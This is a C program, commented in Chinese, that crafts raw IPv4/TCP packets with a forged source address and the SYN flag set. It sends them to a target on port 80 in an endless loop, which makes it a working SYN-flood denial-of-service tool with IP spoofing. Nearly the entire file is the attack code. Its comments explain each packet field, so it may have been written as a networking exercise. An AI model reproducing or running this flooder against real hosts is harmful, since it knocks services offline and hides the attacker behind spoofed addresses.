#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <stdlib.h>

struct pseudo_header//12bytes伪首部
{
    uint32_t source_address;
    uint32_t des_address;
    uint8_t placeholder;
    uint8_t protocol; //标识上层协议类型 
    uint16_t tcp_length;
};

unsigned short checksum(unsigned short *ptr, int nbytes) //用于计算ip和tcp的校验和
{
    long sum;
    short oddbyte;
    short answer;
    sum = 0;
    while(nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if(nbytes == 1)
    {
        oddbyte = 0;
         *((u_char *) & oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short) - sum;
    return(answer);
}

int main()
{
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);  //创建原始socket
    if(s == -1)
    {
        perror("Failed to create");
        exit(1);
    }
    char datagram[4096], source_ip[32], *data, *spoof_gram;
    memset (datagram, 0, 4096);//内存清零
    struct iphdr *ip_hdr = (struct iphdr *)datagram;
    struct tcphdr *tcp_hdr = (struct tcphdr *)(datagram + sizeof(struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;
    data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
    strcpy(data, "Hello");    
    strcpy(source_ip, "192.168.1.2"); //设置源地址（虚假地址）
    sin.sin_family = AF_INET; //标识TCP/IP协议簇
    sin.sin_port = htons(80); //端口号（htons从little endian 转换为 big endian）
    sin.sin_addr.s_addr = inet_addr("1.2.3.4"); //地址    
    //设置ip头
    ip_hdr->ihl = 5; // 首部5个字节
    ip_hdr->version = 4;  //IPV4
    ip_hdr->tos = 0;
    ip_hdr->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
    ip_hdr->id = htonl(54321);    ip_hdr->frag_off = 0;  
    ip_hdr->ttl = 255;
    ip_hdr->protocol = IPPROTO_TCP;  //上层协议使用TCP
    ip_hdr->check = 0;//校验和先置为0，后面会计算
    ip_hdr->saddr = inet_addr(source_ip);  //设置源地址
    ip_hdr->daddr = sin.sin_addr.s_addr; //设置目标地址
    ip_hdr->check = checksum((unsigned short *) datagram, ip_hdr->tot_len); //校验和
    //设置tcp头
    tcp_hdr->source = htons(1234);
    tcp_hdr->dest = htons(80); //设置端口号
    tcp_hdr->seq = 0;    tcp_hdr->ack_seq = 0;
    tcp_hdr->doff = 5;  // tcp头的大小为5个字节
    tcp_hdr->fin = 0;
    tcp_hdr->syn = 1; 
    tcp_hdr->psh = 0;
    tcp_hdr->urg = 0;
    tcp_hdr->window = htons (5840);//设置最大窗口值 
    tcp_hdr->check = 0; //设置校验和为0，之后计算
    tcp_hdr->urg_ptr = 0;
    //设置伪首部的值
    psh.source_address = inet_addr(source_ip);
    psh.des_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );
    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
    spoof_gram = (char *)malloc(psize);
     
    memcpy(spoof_gram, (char *) &psh, sizeof (struct pseudo_header)); //加入伪首部
    memcpy(spoof_gram + sizeof(struct pseudo_header), tcp_hdr, sizeof(struct tcphdr) + strlen(data)); //追加TCP头
    tcp_hdr->check = checksum( (unsigned short *) spoof_gram , psize);//tcp校验和 
     
    int one = 1;
    const int *val = &one;
     
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)//设置套接字参数
   {
        perror("Error setting IP_HDRINCL");
        exit(0);
    }
    
    while (1)
   {
       //发送已经封装好的数据包
        if (sendto (s, datagram, ip_hdr->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
        {
            perror("sendto failed");
       }
        //数据发送成功
        else
        {
            printf ("Packet Send. Length : %d \n" , ip_hdr->tot_len);
        }
    }
     
    return 0;
} 
    
    
